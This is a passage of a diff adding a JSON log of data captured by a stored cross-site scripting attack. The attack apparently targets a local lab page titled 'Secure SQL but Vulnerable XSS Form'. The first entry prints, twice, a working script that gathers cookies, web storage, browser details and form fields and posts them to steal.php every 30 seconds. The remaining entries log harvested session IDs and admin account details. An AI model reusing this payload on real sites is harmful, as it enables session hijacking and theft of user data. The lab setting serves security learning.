+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:25:46.640Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:25:46.640Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:25:54",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_68643642db1a2",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:25:54.891Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:25:54.891Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:26:55",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_6864367f4ad15",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:26:55.296Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:26:55.296Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:27:55",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686436bb4c371",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:27:55.298Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:27:55.298Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:28:55",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686436f74aa53",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:28:55.298Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:28:55.298Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:29:55",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686437334af43",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:29:55.299Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:29:55.299Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:30:20",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_6864374c0dc07",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:30:20.051Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:30:20.051Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:30:26",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_68643752b22c2",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:30:26.726Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:30:26.726Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:30:55",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_6864376f4b3e4",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:30:55.300Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:30:55.300Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:31:55",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686437ab4b854",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:31:55.301Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:31:55.301Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:32:55",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686437e74b1ea",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:32:55.302Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:32:55.302Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:33:56",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686438244aaac",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:33:56.302Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:33:56.302Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:34:57",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686438614c124",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:34:57.304Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:34:57.304Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:35:58",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_6864389e4c98b",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:35:58.304Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:35:58.304Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:36:59",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686438db4bf75",
+        "raw_input": "{\"attack_type\":\"credential_harvester\",\"timestamp\":\"2025-07-01T19:36:59.305Z\",\"existing_credentials\":{\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"current_user\":\"admin\",\"current_email\":\"admin@test.com\"},\"password_fields\":[],\"page_credentials\":[],\"intercepted_logins\":[]}",
+        "stolen_data": {
+            "attack_type": "credential_harvester",
+            "timestamp": "2025-07-01T19:36:59.305Z",
+            "existing_credentials": {
+                "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+                "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+                "current_user": "admin",
+                "current_email": "admin@test.com"
+            },
+            "password_fields": [],
+            "page_credentials": [],
+            "intercepted_logins": []
+        }
+    }
+]
